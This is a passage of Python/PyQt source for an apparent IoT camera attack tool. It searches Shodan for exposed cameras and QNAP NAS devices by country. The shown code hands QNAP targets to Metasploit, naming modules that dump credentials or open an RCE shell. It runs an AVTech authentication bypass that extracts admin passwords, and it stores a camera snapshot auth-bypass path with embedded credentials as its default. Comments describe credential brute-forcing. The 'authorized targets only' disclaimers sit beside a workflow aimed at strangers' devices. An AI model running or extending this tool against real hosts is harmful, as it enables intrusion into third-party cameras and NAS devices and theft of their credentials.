    # hand-off. Authorized targets only - see Help -> Ethical Guidelines.
    # ------------------------------------------------------------------
    def _start_multi_iot_scan(self):
        """Run the Multi IoT Shodan query through the existing ScanWorker. Mirrors
        the generic-Shodan branch of start_scan but sources the query/port from
        the Multi IoT fields and tags results with an IoT/QNAP brand."""
        query = self.build_multi_iot_query()
        if not query:
            QMessageBox.warning(self, "Empty Query",
                                "Pick a Device Type and IoT Brand/Device first.")
            return
        device = self.iot_brand_combo.currentText().split("(")[0].strip().lower()
        brand = "QNAP" if "qnap" in device else "IoT"
        pages = self.pages_spin.value()
        debug = self.debug_check.isChecked()
        timeout = self.timeout_spin.value()
        delay = self.delay_spin.value()
        http_proxy = self.proxy_http.text().strip()
        socks_proxy = self.proxy_socks.text().strip()
        proxies = {}
        if http_proxy: proxies["http"] = http_proxy; proxies["https"] = http_proxy
        if socks_proxy: proxies["http"] = socks_proxy; proxies["https"] = socks_proxy
        self.table.setRowCount(0)
        self.good_table.setRowCount(0)
        self.bad_table.setRowCount(0)
        self.port22_table.setRowCount(0)
        self.port22_open_ips.clear()
        self._port22_checked.clear()
        self.results.clear()
        self.current_index = {"all": -1, "good": -1, "bad": -1, "port22": -1, "fav": self.current_index.get("fav", -1)}
        self.progress.setValue(0)
        self.status_label.setText("Scanning")
        self.log(f"Multi IoT scan ({brand}) - query: {query}", "info")
        self.worker = ScanWorker(query, pages, "", debug, timeout, delay, proxies,
                                 brand=brand, port=self.iot_port_spin.value())
        self.worker.result_signal.connect(self.add_result_row)
        self.worker.log_signal.connect(lambda level, msg: self.log(msg, level))
        self.worker.finished_signal.connect(self.scan_finished)
        self.worker.progress_signal.connect(self.progress.setValue)
        self.worker.status_signal.connect(self.status_label.setText)
        self.worker.start()
        if self.auto_check.isChecked():
            interval = max(60, self.auto_spin.value()) * 1000
            self.auto_refresh_timer.start(interval)

    def check_qnap_target(self, ip, port=None):
        """Non-destructive QNAP fingerprint + CVE assessment for one host, then
        offer a Metasploit hand-off. Read-only until the user chooses to act."""
        if not ip:
            return
        if port is None:
            port = self.iot_port_spin.value() if getattr(self, 'multi_iot_mode', False) else 8080
        self.log(f"🗄 QNAP CVE check on {ip}:{port} (read-only fingerprint)...", "info")
        self._qnap_worker = QnapCveWorker(ip, port, timeout=self.timeout_spin.value(), parent=self)
        self._qnap_worker.result_signal.connect(self._on_qnap_result)
        self._qnap_worker.log_signal.connect(lambda m, l: self.log(m, l))
        self._qnap_worker.start()

    def _on_qnap_result(self, info):
        ip, port = info["ip"], info["port"]
        if not info.get("is_qnap"):
            self.log(f"{ip}:{port} did not fingerprint as a QNAP QTS NAS.", "warning")
            QMessageBox.information(
                self, "QNAP CVE Check",
                f"{ip}:{port} did not fingerprint as a QNAP QTS NAS "
                f"(no authLogin.cgi / QTS markers).\n{info.get('notes','')}")
            return
        cves = info.get("cves") or []
        lines = [f"QNAP NAS detected at {ip}:{port}",
                 f"Model: {info.get('model') or 'unknown'}",
                 f"Firmware: {info.get('version') or 'unknown'}", ""]
        if cves:
            lines.append("Potentially vulnerable (verify before relying on it):")
            lines += [f"  - {c}" for c in cves]
        else:
            lines.append("No known file-access CVE matched the detected firmware "
                         "(or the firmware version couldn't be read).")
        lines.append("")
        lines.append("Metasploit hand-off attempts real file access - use only on "
                     "systems you're authorized to test.")
        text = "\n".join(lines)
        self.log(text, "success" if cves else "info")
        box = QMessageBox(self)
        box.setWindowTitle("QNAP CVE Check")
        box.setText(text)
        msf_btn = box.addButton("Open in Metasploit", QMessageBox.ButtonRole.AcceptRole)
        box.addButton("Close", QMessageBox.ButtonRole.RejectRole)
        box.exec()
        if box.clickedButton() is msf_btn:
            self.open_qnap_in_metasploit(ip, port)

    def open_qnap_in_metasploit(self, ip, port=None):
        """Hand a QNAP target to Metasploit. Opens a REAL external terminal (full
        output - see _launch_msf_external) with a resource script that runs
        `search qnap` + `set RHOSTS/RPORT`, then leaves you at an interactive
        prompt. We don't auto-`use` a hard-coded module name so this works
        whatever modules the installed Metasploit actually ships."""
        path = self._find_msfconsole()
        if not path:
            QMessageBox.warning(
                self, "Metasploit Not Found",
                "Install or locate Metasploit first via the Metasploit Overlay "
                "(Install Metasploit / Browse).")
            return
        self.log(
            f"QNAP -> Metasploit (external terminal): running 'search qnap' + "
            f"'set RHOSTS {ip}'" + (f" + 'set RPORT {port}'" if port else "")
            + ". First launch can take 20-60s. For file access, likely candidates "
              "(if present in your MSF): auxiliary/scanner/http/qnap_backup_config "
              "(dumps NAS config/creds) or exploit/linux/http/qnap_transcode_server "
              "(RCE shell).", "info")
        cmds = ["search qnap", f"set RHOSTS {ip}"]
        if port:
            cmds.append(f"set RPORT {port}")
        self._launch_msf_external(cmds)

    def toggle_pause(self):
        if not self.worker or not self.worker.isRunning(): return
        if hasattr(self.worker, '_paused'):
            if self.worker._paused:
                self.worker.resume()
            else:
                self.worker.pause()
        else:
            self.log("Pause not supported for this scan type.", "warning")

    def stop_scan(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker.wait()
        self.worker = None
        if self.batch_vuln_worker and self.batch_vuln_worker.isRunning():
            self.batch_vuln_worker.stop()
            self.batch_vuln_worker.wait()
        self.auto_refresh_timer.stop()
        self.status_label.setText("Stopped")
        self.log("Scan stopped by user.", "warning")

    def _get_active_table_and_key(self):
        idx = self.filter_tabs.currentIndex()
        if idx == 0: return self.table, "all"
        if idx == 1: return self.good_table, "good"
        if idx == 2: return self.bad_table, "bad"
        if idx == 3: return self.port22_table, "port22"
        if idx == 4: return self.fav_table, "fav"
        return None, None

    def show_result_by_index(self, table, key, index):
        if not table or table.rowCount() == 0: return
        index = max(0, min(index, table.rowCount() - 1))
        table.selectRow(index)
        self.scroll_to_current(table)
        brand = self.brand_combo.currentText()
        if brand == "IP Scanner":
            ip_item = table.item(index, 0)
            hostname_item = table.item(index, 1)
            target = ip_item.text()
            if hostname_item and hostname_item.text().strip():
                target = hostname_item.text().strip()
            url = f"http://{target}"
            self.url_bar.setText(url)
            self.load_url_with_retry(url)
        else:
            url_item = table.item(index, 1)
            if url_item:
                url = url_item.text()
                self.url_bar.setText(url)
                self.load_url_with_retry(url)
        self.current_index[key] = index

    def show_next_result(self):
        table, key = self._get_active_table_and_key()
        if not table: return
        rows = table.rowCount()
        if rows == 0: return
        current = self.current_index.get(key, -1)
        next_idx = 0 if current >= rows - 1 else current + 1
        self.show_result_by_index(table, key, next_idx)

    def show_previous_result(self):
        table, key = self._get_active_table_and_key()
        if not table: return
        rows = table.rowCount()
        if rows == 0: return
        current = self.current_index.get(key, -1)
        prev_idx = rows - 1 if current <= 0 else current - 1
        self.show_result_by_index(table, key, prev_idx)

    def log(self, message, level="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {"info": "[*]", "success": "[OK]", "warning": "[!]", "error": "[ERROR]", "debug": "[DBG]"}.get(level, "[*]")
        line = f"<font color='gray'>{timestamp}</font> {prefix} {message}"
        # Queue instead of appending immediately - appending to a QTextEdit is
        # a relatively expensive layout/repaint operation, and a fast scan can
        # emit many lines per second. _flush_log_queues() (on a ~150ms timer)
        # writes everything queued so far in one batched append instead.
        self._log_queue.append(line)
        # Exploit-result lines (credential grabs, CVE checks) are tagged with a
        # "[CVE-...]" prefix at the source (DVR LOGIN / WIFICAM workers) - mirror
        # just those into the dedicated Exploit tab so they don't get lost in
        # the much higher-volume general scan log.
        if "[CVE-" in message and hasattr(self, 'exploit_log_view'):
            self._exploit_log_queue.append(line)

    def _flush_log_queues(self):
        if self._log_queue:
            self.log_view.append("<br>".join(self._log_queue))
            self._log_queue.clear()
        if self._exploit_log_queue:
            self.exploit_log_view.append("<br>".join(self._exploit_log_queue))
            self._exploit_log_queue.clear()

    def load_settings(self):
        country = self.settings.value("country", "United Kingdom")
        idx = list(COUNTRY_CODES.keys()).index(country) if country in COUNTRY_CODES else 0
        self.country_combo.setCurrentIndex(idx)
        self.year_combo.setCurrentText(self.settings.value("year", "2016"))
        self.port_spin.setValue(int(self.settings.value("port", 80)))
        self.pages_spin.setValue(int(self.settings.value("pages", 10)))
        self.path_edit.setText(self.settings.value("path", "onvif-http/snapshot?auth=YWRtaW46MTEK"))
        self.timeout_spin.setValue(int(self.settings.value("timeout", 3)))
        self.delay_spin.setValue(int(self.settings.value("delay", 0)))
        self.proxy_http.setText(self.settings.value("proxy_http", ""))
        self.proxy_socks.setText(self.settings.value("proxy_socks", ""))
        self.auto_load_check.setChecked(self.settings.value("auto_load", True, type=bool))
        self.debug_check.setChecked(self.settings.value("debug", False, type=bool))
        self.auto_cycle_check.setChecked(self.settings.value("auto_cycle", False, type=bool))
        self.auto_check.setChecked(self.settings.value("auto_refresh_enabled", False, type=bool))
        self.auto_spin.setValue(int(self.settings.value("auto_refresh_interval", 0)))
        self.completion_sound_enabled = self.settings.value("completion_sound_enabled", True, type=bool)
        self.completion_sound_path = self.settings.value("completion_sound_path", COMPLETION_SOUND)
        saved_use_ie = self.settings.value("use_ie", None)
        if saved_use_ie is None:
            self.use_ie = IE_AVAILABLE
        else:
            self.use_ie = saved_use_ie == "true"
        saved_brand = self.settings.value("brand", "Hikvision")
        self.brand_combo.setCurrentText(saved_brand)
        self.on_brand_changed(saved_brand)
        saved_theme = self.settings.value("theme", "default")
        self.set_theme(saved_theme, save=False)

    def save_settings(self):
        self.settings.setValue("country", self.country_combo.currentText())
        self.settings.setValue("year", self.year_combo.currentText())
        self.settings.setValue("port", self.port_spin.value())
        self.settings.setValue("pages", self.pages_spin.value())
        self.settings.setValue("path", self.path_edit.text())
        self.settings.setValue("timeout", self.timeout_spin.value())
        self.settings.setValue("delay", self.delay_spin.value())
        self.settings.setValue("proxy_http", self.proxy_http.text())
        self.settings.setValue("proxy_socks", self.proxy_socks.text())
        self.settings.setValue("auto_load", self.auto_load_check.isChecked())
        self.settings.setValue("debug", self.debug_check.isChecked())
        self.settings.setValue("auto_cycle", self.auto_cycle_check.isChecked())
        self.settings.setValue("auto_refresh_enabled", self.auto_check.isChecked())
        self.settings.setValue("auto_refresh_interval", self.auto_spin.value())
        self.settings.setValue("completion_sound_enabled", self.completion_sound_enabled)
        self.settings.setValue("completion_sound_path", self.completion_sound_path)
        self.settings.setValue("brand", self.brand_combo.currentText())
        self.settings.setValue("use_ie", str(self.use_ie))
        self.settings.setValue("theme", self.current_theme)

    def export_csv(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export CSV", "", "CSV Files (*.csv)")
        if path:
            with open(path, "w", newline="") as f:
                writer = csv.writer(f)
                brand = self.brand_combo.currentText()
                if brand == "IP Scanner":
                    writer.writerow(["IP", "Hostname", "Open Ports", "Banner", "Web Detect"])
                    for r in self.results:
                        writer.writerow([r["ip"], r.get("hostname", ""), r.get("open_ports", ""), r.get("banners", ""), r.get("web_detect", "")])
                else:
                    writer.writerow(["IP", "URL", "Status", "Code"])
                    for r in self.results:
                        writer.writerow([r["ip"], r["url"], r["status"], r.get("code", "")])
            self.log(f"Exported to {path}", "success")

    def export_html(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export HTML", "", "HTML Files (*.html)")
        if path:
            html = "<html><body><table border='1'><tr>"
            brand = self.brand_combo.currentText()
            if brand == "IP Scanner":
                html += "<th>IP</th><th>Hostname</th><th>Open Ports</th><th>Banner</th><th>Web Detect</th></tr>"
                for r in self.results:
                    html += f"<tr><td>{r['ip']}</td><td>{r.get('hostname','')}</td><td>{r.get('open_ports','')}</td><td>{r.get('banners','')}</td><td>{r.get('web_detect','')}</td></tr>"
            else:
                html += "<th>IP</th><th>URL</th><th>Status</th><th>Code</th></tr>"
                for r in self.results:
                    html += f"<tr><td>{r['ip']}</td><td><a href='{r['url']}'>{r['url']}</a></td><td>{r['status']}</td><td>{r.get('code','')}</td></tr>"
            html += "</table></body></html>"
            with open(path, "w") as f:
                f.write(html)
            self.log(f"Exported to {path}", "success")

    # ------------------
    # PSS mode handlers
    # ------------------
    def load_plugins(self):
        for file in PLUGIN_DIR.glob("*.py"):
            try:
                spec = importlib.util.spec_from_file_location(file.stem, file)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                for name in dir(mod):
                    obj = getattr(mod, name)
                    if isinstance(obj, type) and issubclass(obj, BrowserPlugin) and obj != BrowserPlugin:
                        plugin = obj(self.ie if self.use_ie else self.web_view)
                        self.plugins[plugin.name] = plugin
                        self.log(f"Loaded plugin: {plugin.name}", "success")
            except Exception as e:
                self.log(f"Plugin load failed: {file.name} → {e}", "error")

    def apply_theme(self):
        if self.current_theme == "dark":
            self.setStyleSheet(self.dark_stylesheet())
            QApplication.setPalette(self.dark_palette())
        else:
            self.setStyleSheet(self.default_stylesheet())
            QApplication.setPalette(self.default_palette())
        self.apply_theme_accent_overrides()
        self.theme_default_action.setChecked(self.current_theme == "default")
        self.theme_dark_action.setChecked(self.current_theme == "dark")

    def apply_theme_accent_overrides(self):
        """Update widgets with local styles that do not inherit the app stylesheet."""
        if self.current_theme == "dark":
            button_style = (
                "QPushButton { background: #3b4148; color: #e1e5e8; "
                "border: 1px solid #737c84; padding: 6px 12px; border-radius: 6px; } "
                "QPushButton:hover { background: #4b535b; border-color: #a1a9af; }"
            )
            self.browser_frame.setStyleSheet("background: #202428; border: 2px solid #737c84; border-radius: 8px;")
            self.controls_frame.setStyleSheet("background: #292e33; border-bottom: 1px solid #737c84;")
            self.browser_container.setStyleSheet("background: #202428;")
            self.url_bar.setStyleSheet("background: #292e33; color: #e1e5e8; border: 1px solid #737c84; padding: 8px; border-radius: 6px;")
            self.motd_box.setStyleSheet(
                "QGroupBox { background: #23272b; border: 1px solid #737c84; border-radius: 8px; margin-top: 10px; padding-top: 10px; } "
                "QGroupBox::title { color: #b8c0c6; subcontrol-origin: margin; left: 10px; padding: 0 5px; } "
                "QLabel { background: transparent; }"
            )
            self.motd_label.setStyleSheet("background: #000000; color: #d8dde1; border: 1px solid #737c84; border-radius: 8px; padding: 8px;")
        else:
            button_style = (
                "QPushButton { background: #1e3a5f; color: #a8e6cf; border: 1px solid #00d4ff; "
                "padding: 6px 12px; border-radius: 6px; } "
                "QPushButton:hover { background: #2a5298; }"
            )
            self.browser_frame.setStyleSheet("background: #0d1b2a; border: 2px solid #00d4ff; border-radius: 8px;")
            self.controls_frame.setStyleSheet("background: #1b263b; border-bottom: 1px solid #00d4ff;")
            self.browser_container.setStyleSheet("background: #0d1b2a;")
            self.url_bar.setStyleSheet("background: #16213e; color: #a8e6cf; border: 1px solid #00d4ff; padding: 8px; border-radius: 6px;")
            self.motd_box.setStyleSheet(
                "QGroupBox { background: #12233d; border: 1px solid #00d4ff; border-radius: 8px; margin-top: 10px; padding-top: 10px; } "
                "QGroupBox::title { color: #00ffff; subcontrol-origin: margin; left: 10px; padding: 0 5px; } "
                "QLabel { background: transparent; }"
            )
            self.motd_label.setStyleSheet("background: #000000; color: #a8e6cf; border: 1px solid #00d4ff; border-radius: 8px; padding: 8px;")

        for name in (
            "tz_button", "reset_btn", "adv_button", "avtech_btn",
            "ssh_button", "dahua_brute_btn", "dahua_snap_btn",
            "dahua_masscan_btn", "dahua_export_xml_btn", "refresh_btn",
            "screenshot_btn", "save_fav_btn", "prev_btn", "next_btn",
        ):
            widget = getattr(self, name, None)
            if widget is not None:
                widget.setStyleSheet(button_style)

    def set_theme(self, theme_name, save=True):
        if theme_name not in ("default", "dark"): return
        self.current_theme = theme_name
        self.apply_theme()
        if save: self.save_settings()
        self.log(f"Theme changed to {theme_name}", "info")

    def default_stylesheet(self):
        return """
            QLabel { color: #a8e6cf; font-size: 11pt; }
            QGroupBox { color: #00ffff; font-weight: bold; border: 2px solid #00ffff; border-radius: 8px; margin: 10px; padding-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
            QLineEdit, QComboBox, QSpinBox { background: #16213e; color: #a8e6cf; border: 1px solid #00ffff; padding: 6px; border-radius: 4px; font-size: 11pt; }
            QLineEdit:focus, QComboBox:focus, QSpinBox:focus { border: 1px solid #a8e6cf; }
            QPushButton { background: #0f3460; color: #a8e6cf; border: 2px solid #00ffff; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 11pt; }
            QPushButton:hover { background: #1e5f9e; }
            QPushButton:pressed { background: #0b2a49; }
            QTabWidget::pane { border: 2px solid #00ffff; }
            QTabBar::tab { background: #16213e; color: #a8e6cf; padding: 10px 12px; margin: 2px; border: 1px solid #00ffff; border-top-left-radius: 5px; border-top-right-radius: 5px; }
            QTabBar::tab:hover { background: #1a2b4d; }
            QTabBar::tab:selected { background: #00aaff; color: #000000; }
            QTableWidget { background-color: #16213e; alternate-background-color: #1f2a44; gridline-color: #00ffff; color: #a8e6cf; font-size: 11pt; }
            QTableWidget::item:selected { background-color: #00aaff; color: #000000; }
            QTableWidget::item:focus { outline: none; border: none; }
            QHeaderView::section { background-color: #0f3460; color: #a8e6cf; padding: 6px; border: 1px solid #00ffff; font-weight: bold; }
            QStatusBar { background: #122033; color: #a8e6cf; }
            QMenuBar { background: #122033; color: #a8e6cf; }
            QMenuBar::item:selected { background: #1e5f9e; }
            QMenu { background: #16213e; color: #a8e6cf; border: 1px solid #00ffff; }
            QMenu::item:selected { background: #00aaff; color: #000000; }
            QToolBar { background: #122033; border: none; spacing: 6px; }
        """

    def dark_stylesheet(self):
        return """
            QLabel { color: #cccccc; font-size: 11pt; }
            QGroupBox { color: #b8c0c6; font-weight: bold; border: 2px solid #737c84; border-radius: 8px; margin: 10px; padding-top: 10px; }
            QLineEdit, QComboBox, QSpinBox { background: #2b2f33; color: #d8dde1; border: 1px solid #737c84; padding: 6px; border-radius: 4px; font-size: 11pt; }
            QLineEdit:focus, QComboBox:focus, QSpinBox:focus { border: 1px solid #a1a9af; }
            QPushButton { background: #363c42; color: #d8dde1; border: 2px solid #737c84; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 11pt; }
            QPushButton:hover { background: #4b535b; border-color: #a1a9af; }
            QPushButton:pressed { background: #2d3238; }
            QTabWidget::pane { border: 2px solid #737c84; }
            QTabBar::tab { background: #2b2f33; color: #c8ced3; padding: 10px 12px; margin: 2px; border: 1px solid #737c84; border-top-left-radius: 5px; border-top-right-radius: 5px; }
            QTabBar::tab:hover { background: #3a4046; }
            QTabBar::tab:selected { background: #606970; color: #f0f2f4; }
            QTableWidget { background-color: #2b2f33; alternate-background-color: #3a4046; gridline-color: #606970; color: #d8dde1; font-size: 11pt; }
            QTableWidget::item:selected { background-color: #606970; color: #f0f2f4; }
            QTableWidget::item:focus { outline: none; border: none; }
            QHeaderView::section { background-color: #363c42; color: #d8dde1; padding: 6px; border: 1px solid #737c84; font-weight: bold; }
            QStatusBar { background: #1f2226; color: #d8dde1; }
            QMenuBar { background: #1f2226; color: #d8dde1; }
            QMenuBar::item:selected { background: #4b535b; }
            QMenu { background: #2b2f33; color: #d8dde1; border: 1px solid #737c84; }
            QMenu::item:selected { background: #606970; color: #f0f2f4; }
            QToolBar { background: #1f2226; border: none; spacing: 6px; }
        """

    def default_palette(self):
        p = QPalette()
        p.setColor(QPalette.ColorRole.Window, QColor("#1a1a2e"))
        p.setColor(QPalette.ColorRole.Base, QColor("#16213e"))
        p.setColor(QPalette.ColorRole.AlternateBase, QColor("#1f2a44"))
        p.setColor(QPalette.ColorRole.Text, QColor("#a8e6cf"))
        p.setColor(QPalette.ColorRole.ButtonText, QColor("#a8e6cf"))
        p.setColor(QPalette.ColorRole.HighlightedText, QColor("#000000"))
        p.setColor(QPalette.ColorRole.Button, QColor("#0f3460"))
        p.setColor(QPalette.ColorRole.Highlight, QColor("#00aaff"))
        p.setColor(QPalette.ColorRole.Link, QColor("#00ffff"))
        return p

    def dark_palette(self):
        p = QPalette()
        p.setColor(QPalette.ColorRole.Window, QColor("#1e1e1e"))
        p.setColor(QPalette.ColorRole.Base, QColor("#2d2d2d"))
        p.setColor(QPalette.ColorRole.AlternateBase, QColor("#3a3a3a"))
        p.setColor(QPalette.ColorRole.Text, QColor("#dddddd"))
        p.setColor(QPalette.ColorRole.ButtonText, QColor("#dddddd"))
        p.setColor(QPalette.ColorRole.HighlightedText, QColor("#ffffff"))
        p.setColor(QPalette.ColorRole.Button, QColor("#3c3c3c"))
        p.setColor(QPalette.ColorRole.Highlight, QColor("#606970"))
        p.setColor(QPalette.ColorRole.Link, QColor("#b8c0c6"))
        return p

    def reset_layout(self):
        self.splitter.setSizes([500, 900])
        for t in [self.table, self.good_table, self.bad_table, self.port22_table, self.fav_table, self.passwords_table]:
            t.resizeColumnsToContents()

    def show_disclaimer(self):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Icon.Warning)
        msg.setWindowTitle(" Working! ")
        msg.setText("<h3>Welcome to IOT Camera Analyzer<br>Coded By English Warriors</h3>")
        msg.exec()

    def show_dev_tools(self):
        """Open lightweight, read-only tools for diagnosing the Qt widget tree."""
        dlg = QDialog(self)
        dlg.setWindowTitle("Developer Tools")
        dlg.resize(900, 620)

        layout = QVBoxLayout(dlg)
        info = QLabel(
            "Read-only GUI diagnostics. Select a widget to inspect its object name, size, and state."
        )
        info.setWordWrap(True)
        layout.addWidget(info)

        tree = QTreeWidget()
        tree.setHeaderLabels(["Widget", "Object name", "Geometry", "Visible", "Enabled"])
        tree.setAlternatingRowColors(True)
        tree.setUniformRowHeights(True)
        tree.setColumnWidth(0, 300)
        tree.setColumnWidth(1, 220)
        tree.setColumnWidth(2, 150)
        layout.addWidget(tree, 1)

        def widget_text(widget):
            class_name = widget.metaObject().className()
            name = widget.objectName() or "-"
            geo = widget.geometry()
            return [
                class_name,
                name,
                f"{geo.x()},{geo.y()} {geo.width()}x{geo.height()}",
                "yes" if widget.isVisible() else "no",
                "yes" if widget.isEnabled() else "no",
            ]

        def add_widget(widget, parent_item=None):
            item = QTreeWidgetItem(parent_item or tree, widget_text(widget))
            item.setData(0, Qt.ItemDataRole.UserRole, widget)
            for child in widget.children():
                if isinstance(child, QWidget):
                    add_widget(child, item)
            return item

        def refresh_tree():
            tree.clear()
            add_widget(self)
            tree.expandToDepth(1)

        def copy_tree():
            rows = []
            for item in tree.findItems("*", Qt.MatchFlag.MatchWildcard | Qt.MatchFlag.MatchRecursive):
                depth = 0
                parent = item.parent()
                while parent is not None:
                    depth += 1
                    parent = parent.parent()
                rows.append("  " * depth + " | ".join(item.text(i) for i in range(5)))
            QApplication.clipboard().setText("\n".join(rows))
            self.log("Developer widget tree copied to clipboard.", "info")

        def inspect_selected(item, column):
            widget = item.data(0, Qt.ItemDataRole.UserRole)
            if isinstance(widget, QWidget):
                self.log(
                    f"GUI inspect: {widget.metaObject().className()} "
                    f"objectName={widget.objectName() or '-'} geometry={widget.geometry()}",
                    "info",
                )

        tree.itemDoubleClicked.connect(inspect_selected)
        refresh_tree()

        button_row = QHBoxLayout()
        refresh_btn = QPushButton("Refresh")
        refresh_btn.clicked.connect(refresh_tree)
        copy_btn = QPushButton("Copy Widget Tree")
        copy_btn.clicked.connect(copy_tree)
        button_row.addWidget(refresh_btn)
        button_row.addWidget(copy_btn)
        button_row.addStretch()
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dlg.accept)
        button_row.addWidget(close_btn)
        layout.addLayout(button_row)
        dlg.exec()

    def show_guidelines(self):
        dlg = QDialog(self)
        dlg.setWindowTitle("Ethical Guidelines")
        layout = QVBoxLayout(dlg)
        text = QTextEdit()
        text.setReadOnly(True)
        try:
            text.setHtml(open(self.resource_path("guidelines.html"), "r", encoding="utf-8").read())
        except:
            text.setPlainText("Guidelines file missing.")
        layout.addWidget(text)
        btn = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok)
        btn.accepted.connect(dlg.accept)
        layout.addWidget(btn)
        dlg.resize(600, 400)
        dlg.exec()

    def show_about(self):
        QMessageBox.about(self, "About", "<h2> Coded by Ninja / English Warrior</h2><p>Version 1.1<br>Educational tool for IoT camera research.<br>Use responsibly and ethically.</p>")

    def closeEvent(self, event):
        self.save_settings()
        self.save_favorites()
        if self.ie:
            try: self.ie.Quit()
            except: pass
        super().closeEvent(event)

    def get_country_flag(self, ip):
        # Normalize IP/host (strip scheme, path and port) before lookup
        def _normalize(addr):
            try:
                s = str(addr).strip()
                if s.startswith("http://") or s.startswith("https://"):
                    s = s.split("//", 1)[1]
                s = s.split("/", 1)[0]
                if s.count(":") >= 1 and not ("[" in s and "]" in s):
                    # remove port (IPv6 addresses contain ':' but are inside brackets in URLs)
                    if s.count(":") == 1:
                        s = s.split(":")[0]
                    else:
                        # fallback: keep as-is for IPv6
                        pass
                return s
            except Exception:
                return str(addr)

        if getattr(self, '_loading_history', False):
            return f"🌐 {ip}"
        if not hasattr(self, "ip_country_cache"):
            self.ip_country_cache = {}

        norm = _normalize(ip)
        if norm in self.ip_country_cache:
            # cached value stores the final display string
            return self.ip_country_cache[norm]

        flag = "🌐"
        try:
            # Treat common private ranges (simple checks)
            if norm.startswith(("10.", "192.168.")) or norm.startswith("172."):
                flag = "🏠"
            else:
                response = requests.get(f"http://ip-api.com/json/{norm}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status") == "success":
                        cc = data.get("countryCode")
                        flag = FLAG_EMOJI.get(cc, "🌐")
                    else:
                        flag = "❓"
                else:
                    flag = "⚠️"
        except Exception:
            flag = "❌"

        result = f"{flag} {ip}"
        # cache by normalized address
        self.ip_country_cache[norm] = result
        return result

    def reset_cam(self):
        try:
            exe_path = Path(__file__).parent / "Cam_reset.exe"
            subprocess.Popen(str(exe_path), shell=True)
            self.log("Cam_reset.exe launched.", "success")
        except Exception as e:
            self.log(f"Failed to launch Cam_reset.exe: {e}", "error")

    def show_timezones_in_log(self):
        self.log("=== All Time Zones ===", "info")
        for tz_name in pytz.all_timezones:
            tz = pytz.timezone(tz_name)
            now = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
            self.log(f"{tz_name} → {now}", "info")
        self.log("=== End of Time Zones ===", "info")

    def open_avtech_tester(self):
        ip, ok = QInputDialog.getText(self, "AVTech Vulnerability Tester",
                                      "Target IP / hostname (port 80):", text="")
        if not ok or not ip.strip(): return
        ip = ip.strip()
        client = avtech(ip, 80)
        self.log(f"🚀 AVTech Tester started for {ip}", "info")
        cap = client.getCapability()
        self.log(f"📡 Capability info leak: {cap[:300]}...", "info")
        bypass = client.checkBypass()
        self.log(f"🔓 Authentication bypass test: {bypass}", "info")
        if client.cabbyp or client.nobodybyp:
            pwd = client.getAdminPwd()
            self.log(f"🔑 Admin password extracted: {pwd or 'None'}", "success" if pwd else "warning")
            if pwd:
                self.log("💡 You can now use the extracted credentials in the browser!", "success")
        else:
            self.log("⚠️ No unauthenticated bypass — try manual login in the browser", "warning")
        self.log(f"✅ AVTech tests finished for {ip}.", "info")
        QMessageBox.information(self, "AVTech Tester", f"Tests complete for {ip}\n\nCheck the Logs tab for full output.")

    # ------------------------------------------------------------------
    # Metasploit-style CVE / Exploit overlay (Stage 4)
    #
    # Replaces the old single-target "Vuln Scanner" dialog-and-Logs flow.
    # Powered by the existing CameraVulnScanner (fingerprint + CVE_DB lookup +
    # HTTP/ONVIF/Telnet/SSH credential brute-force, unmodified) via the new
    # BatchVulnScanWorker, so results can come from either:
    #   - the overlay's own "Run Batch Vuln Scan" button (every Good-tab IP), or
    #   - a right-click "Metasploit Scan" on a single row in any results table.
    # Both paths land in the same overlay table/detail pane instead of Logs.
    # Visibility is independent of scanning: the View menu's "Metasploit
    # Overlay" checkbox (toggle_vuln_overlay) is the only thing that shows/hides it -
    # running a scan never forces it into view.
    # ------------------------------------------------------------------
    def create_vuln_overlay_widget(self):
        # QStackedWidget sizes itself to the LARGEST sizeHint/minimumSizeHint
        # across *all* added pages, not just the visible one - so a page full
        # of tables/text would otherwise permanently inflate browser_stack's
        # (and therefore the whole splitter/window's) size the moment it's
        # added, even before "Metasploit Overlay" is ever checked. Capping
        # this page's own reported size hint keeps browser_stack exactly the
        # size it was before this feature existed; the overlay still fills
        # whatever space it's given once actually shown.
        class _SizeCappedWidget(QWidget):
            def sizeHint(self):
                return QSize(1, 1)
            def minimumSizeHint(self):
                return QSize(1, 1)
        w = _SizeCappedWidget()
        layout = QVBoxLayout(w)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(8)

        header = QHBoxLayout()
        title = QLabel("🛡 CVE / Exploit Overlay")
        title.setStyleSheet("font-size: 16px; font-weight: bold; color: #00d4ff;")
        header.addWidget(title, 1)
        self.vuln_overlay_scan_btn = QPushButton("Run Batch Vuln Scan (Good tab)")
        self.vuln_overlay_scan_btn.clicked.connect(lambda: self._start_batch_vuln_scan())
        header.addWidget(self.vuln_overlay_scan_btn)
        layout.addLayout(header)

        # ── Full Metasploit Framework integration ─────────────────────────
        # Beyond the built-in CVE table below, this installs the REAL Metasploit
        # Framework (official Rapid7 build for whatever OS the user is on) and
        # drives a live msfconsole embedded right here - so the whole of
        # Metasploit is navigable/usable, not just the bundled CVE checks.
        self.msf_process = None
        self.msf_install_worker = None
        self._msf_path = None
        msf_group = QGroupBox("🎯 Metasploit Framework (full msfconsole)")
        msf_v = QVBoxLayout(msf_group)
        msf_row = QHBoxLayout()
        self.msf_status_label = QLabel("Status: checking...")
        self.msf_status_label.setStyleSheet("color:#cccccc;")
        self.msf_status_label.setWordWrap(True)
        msf_row.addWidget(self.msf_status_label, 1)
        self.msf_detect_btn = QPushButton("Detect")
        self.msf_detect_btn.setToolTip("Re-check whether Metasploit is installed on this PC")
        self.msf_detect_btn.clicked.connect(self._refresh_msf_status)
        msf_row.addWidget(self.msf_detect_btn)
        self.msf_browse_btn = QPushButton("Browse...")
        self.msf_browse_btn.setToolTip(
            "Point directly at your msfconsole if auto-detect misses it (custom "
